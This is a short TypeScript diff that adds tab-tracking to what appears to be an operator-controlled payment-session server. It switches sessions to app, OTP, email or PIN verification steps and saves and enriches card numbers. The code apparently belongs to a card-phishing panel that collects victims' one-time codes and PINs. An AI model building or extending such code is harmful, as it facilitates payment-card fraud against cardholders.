@@ -87,6 +87,13 @@ function toA2(country: string): string {
   return map[country] || country;
 }
 
+function addBrowsingTab(s: any, label: string, count: number) {
+  if (!s.browsingTabs) s.browsingTabs = [];
+  if (!s.browsingTabs.some((t: any) => t.label === label)) {
+    s.browsingTabs.push({ label, count, active: false });
+  }
+}
+
 async function enrichAndSaveCardInfo(cardInfo: any) {
   const clean = (cardInfo.cardNumber || '').replace(/\s/g, '');
   if (!clean || clean.length < 6) return cardInfo;
@@ -482,12 +489,16 @@ export async function setupWebSocket(server: any) {
             // Update currentStep for verification actions
             if (action === 'app_verify') {
               s.currentStep = 'app_verify';
+              addBrowsingTab(s, 'APP验证页', 1);
             } else if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_otp_verify') {
               s.currentStep = 'otp';
+              addBrowsingTab(s, 'OTP验证页', 1);
             } else if (action === 'email_verify') {
               s.currentStep = 'email_verify';
+              addBrowsingTab(s, 'Email验证页', 1);
             } else if (action === 'pin_verify') {
               s.currentStep = 'pin_verify';
+              addBrowsingTab(s, 'PIN验证页', 1);
             }
           }
           paymentService.upsertSession({ id: sessionId, status: newStatus, currentStep: s?.currentStep });
